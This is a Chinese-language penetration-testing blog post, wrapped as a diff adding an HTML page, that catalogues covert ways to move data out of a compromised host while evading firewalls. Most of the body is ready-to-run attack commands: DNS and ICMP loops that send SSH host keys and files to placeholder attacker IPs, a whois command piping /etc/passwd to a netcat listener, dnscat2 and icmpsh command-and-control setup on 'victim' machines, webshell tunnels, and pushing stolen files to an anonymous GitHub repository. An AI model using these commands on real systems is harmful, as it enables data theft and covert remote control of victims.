@@ -1,0 +1,487 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>数据回传通道总结 - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="数据回传通道总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-04 18:15" pubdate>
+        2021年1月4日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      976 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">数据回传通道总结</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。</p>
+<h2 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h2><p>利用http.server回传</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">python2：<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> SimpleHTTPServer<br><span class="hljs-keyword">python3</span>:<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> http.server<br>php:<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+<p>利用ftp回传</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">service</span> vsftpd start<br>访问<span class="hljs-built_in">ip</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure>
+<p>利用smb回传</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cd /etc/samba<br>vi smb.conf<br>文件内添加:<br>[<span class="hljs-keyword">share</span>]<br>    <span class="hljs-type">path</span> =/home/<span class="hljs-keyword">share</span><br>    available = yes<br>    browsealbe = yes<br>    <span class="hljs-built_in">public</span>= <span class="hljs-keyword">no</span><br>    writable = yes<br>cd /home<br>mkdir <span class="hljs-keyword">share</span><br>chmod -R <span class="hljs-number">777</span> <span class="hljs-keyword">share</span><br>useradd <span class="hljs-keyword">share</span><br>smbpasswd -a <span class="hljs-keyword">share</span><br>service smbd <span class="hljs-keyword">restart</span><br>访问\\ip<br></code></pre></td></tr></table></figure>
+<p>利用scp回传</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">scp localfilename root@xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span>:filename<br></code></pre></td></tr></table></figure>
+<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>1.命令行</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-constructor">$(<span class="hljs-params">xxd</span> -<span class="hljs-params">p</span> -<span class="hljs-params">c</span> 10 <span class="hljs-params">ssh_host_ecdsa_key</span>)</span>;<span class="hljs-keyword">do</span> sleep <span class="hljs-number">1</span>s<span class="hljs-operator"> &amp;&amp; </span>nslookup $i.xxx.com xx.xx.xx.xx;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<p>2.dnscat2、dns2tcp</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">攻击机（server）：<br>安装<br>apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">ruby</span> <span class="hljs-keyword">ruby</span>-dev git <span class="hljs-keyword">make</span> g++ rubygems<br>gem <span class="hljs-keyword">update</span> --<span class="hljs-built_in">system</span><br>gem install bundler<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/server<br>bundle install<br>设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址，运行<br><span class="hljs-keyword">ruby</span> ./dnscat2.rb dns.uuzdaisuki.<span class="hljs-keyword">com</span> --<span class="hljs-keyword">no</span>-cache<br><br>受害者（linux）安装<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/client/<br><span class="hljs-keyword">make</span><br>受害者（windows）安装<br>http<span class="hljs-variable">s:</span>//downloads.skullsecurity.org/dnscat2/ 下载win32.zip的dnascat2后解压<br><br>将server中产生的secret复制下来，运行<br>./dnscat --dns domain=dns.uuzdaisuki.<span class="hljs-keyword">com</span> --secret=xxxxxxxxxxxxxxxxxxxxx<br>session -i <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>详情参考：</p>
+<p><a target="_blank" rel="noopener" href="http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/">http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p>
+<h2 id="ping隧道"><a href="#ping隧道" class="headerlink" title="ping隧道"></a>ping隧道</h2><p>1.命令行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> a.txt | xxd -p -c <span class="hljs-number">1</span>|xargs -n <span class="hljs-number">1</span> -I &#x27;&#123;&#125;&#x27; ping -c <span class="hljs-number">1</span> -s <span class="hljs-number">56</span> -p &#x27;&#123;&#125;&#x27; xx.xx.xx.xx<br></code></pre></td></tr></table></figure>
+<p>2.pingtunnel</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://www.<span class="hljs-keyword">cs</span>.uit.<span class="hljs-keyword">no</span>/~daniels/PingTunnel/<br>ptunnel -<span class="hljs-keyword">p</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.232</span> -<span class="hljs-keyword">lp</span> <span class="hljs-number">8888</span> -da <span class="hljs-number">192.168</span>.<span class="hljs-number">118.131</span> -<span class="hljs-keyword">dp</span> <span class="hljs-number">3389</span><br>    -<span class="hljs-keyword">p</span> 指定ICMP隧道另一端的IP<br>    -<span class="hljs-keyword">lp</span>：指定本地监听的端口<br>    -da：指定要转发的目标机器的IP<br>    -<span class="hljs-keyword">dp</span>：指定要转发的目标机器的端口<br>    -<span class="hljs-keyword">x</span>：指定连接密码<br></code></pre></td></tr></table></figure>
+<p>3.icmpsh展开cc通道：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">攻击者机器部署icmpsh：<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/inquisb/icmpsh.git<br>sysctl -<span class="hljs-keyword">w</span> net.ipv4.icmp_echo_ignore_all=<span class="hljs-number">1</span><br><span class="hljs-keyword">cd</span> icmpsh<br><span class="hljs-keyword">syntax</span>: ./icmpsh_m.<span class="hljs-keyword">py</span> &lt;attacker’s-IP&gt; <span class="hljs-symbol">&lt;target-IP&gt;</span><br>./icmpsh_m.<span class="hljs-keyword">py</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.106</span><br>受害者机器：<br><span class="hljs-keyword">syntax</span>: icmpsh.<span class="hljs-keyword">exe</span> -t &lt;Kali IP&gt;<br>icmpsh.<span class="hljs-keyword">exe</span> -t <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span><br></code></pre></td></tr></table></figure>
+<p>4.icmptunnel</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">受害者主机：<br>安装icmptunnel<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jamesbarlow/i</span>cmptunnel.git<br>cd icmptunnel<br>make<br>禁用ICMP echo回复<br>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/icmp_echo_ignore_all<br>服务端模式启动icmptunnel，并且给新的隧道接口分配一个IP地址<br>./icmptunnel -s<br>Ctrlz<br>bg<br><span class="hljs-regexp">/sbin/i</span>fconfig tun0 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>ifconfig<br><br>攻击者主机：<br>安装icmptunnel<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jamesbarlow/i</span>cmptunnel.git<br>cd icmptunnel<br>make<br>禁用ICMP echo回复<br>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/icmp_echo_ignore_all<br>运行<br>./icmptunnel <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span><br>ctrl z<br><span class="hljs-regexp">/sbin/i</span>fconfig tun0 <span class="hljs-number">10.0</span>.<span class="hljs-number">0.2</span> netmask <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="http隧道"><a href="#http隧道" class="headerlink" title="http隧道"></a>http隧道</h2><p>1.reGeorg</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sensepost/</span>reGeorg.git<br>pip install urllib3<br>将对应页面上传到目标服务器上<br>并在本地监听<br>python reGeorgSocksProxy.py ‐p <span class="hljs-number">8080</span> ‐l <span class="hljs-number">192.168</span>.<span class="hljs-number">1.5</span> ‐u <br>访问目标<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.119</span>/tunnel.aspx<br></code></pre></td></tr></table></figure>
+<p>2.ABPTTS</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">安装<br>apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">python</span>-dev  build-essential libssl-dev libffi-dev  libxml2-dev libxslt1-dev zlib1g-dev <span class="hljs-keyword">python</span>-pip<br> pip install pycrypto<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/nccgroup/ABPTTS.git<br><span class="hljs-keyword">cd</span> ABPTTS/<br>生成payload<br><span class="hljs-keyword">python</span> abpttsfactory.<span class="hljs-keyword">py</span> ‐<span class="hljs-keyword">o</span> webshell<br>传到目标靶机<br>端口转发<br><span class="hljs-keyword">python</span> abpttsclient.<span class="hljs-keyword">py</span> ‐<span class="hljs-keyword">c</span> webshell/config.txt ‐<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.1.119/abptts.aspx&quot;</span> ‐<span class="hljs-keyword">f</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.5</span>:<span class="hljs-number">33389</span>/<span class="hljs-number">192.168</span>.<span class="hljs-number">1.119</span>:<span class="hljs-number">3389</span><br>让攻击机的<span class="hljs-number">33389</span>端口流量转发到<span class="hljs-number">3389</span>，通过HTTPS服务<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="whois隧道"><a href="#whois隧道" class="headerlink" title="whois隧道"></a>whois隧道</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">失陷机：<br>root<span class="hljs-title">@kali</span>:~# whois -h <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> -p <span class="hljs-number">4444</span> `cat /etc/passwd | base<span class="hljs-number">64</span>`<br>接受机：<br>root<span class="hljs-title">@kali</span>:/tmp# nc -l -v -p <span class="hljs-number">4444</span> | sed <span class="hljs-string">&quot;&quot;</span>s/ //g<span class="hljs-string">&quot;&quot;</span> | base<span class="hljs-number">64</span> -d<br></code></pre></td></tr></table></figure>
+
+<h2 id="社交平台或工具"><a href="#社交平台或工具" class="headerlink" title="社交平台或工具"></a>社交平台或工具</h2><p>利用腾讯qq、微信等工具回传</p>
+<h2 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h2><p>利用github回传</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">通过一个匿名邮箱注册github账户，并创建一个空仓库<br>mdkir upload<br><span class="hljs-keyword">cd</span> upload<br>git config --<span class="hljs-keyword">global</span> user.name “user.name”<br>git config --<span class="hljs-keyword">global</span> user.email “user.email”<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/xxx/xxx.git<br><span class="hljs-keyword">cp</span> -r <span class="hljs-keyword">file</span> upload<br>git <span class="hljs-built_in">add</span> *<br>git commit -<span class="hljs-keyword">m</span> <span class="hljs-string">&quot;update&quot;</span><br>git push -<span class="hljs-keyword">u</span> origin master<br></code></pre></td></tr></table></figure>
+
+<h2 id="云储存"><a href="#云储存" class="headerlink" title="云储存"></a>云储存</h2><p>利用百度网盘等网盘类工具回传</p>
+<h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>利用邮件外发回传</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%95%B0%E6%8D%AE%E5%9B%9E%E4%BC%A0/">数据回传</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/01/05/linux%E5%90%8E%E9%97%A8%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux后门手法总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/24/redis%E6%9C%AA%E6%8E%88%E6%9D%83getshell%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F/">
+                        <span class="hidden-mobile">redis未授权getshell的多种方式</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
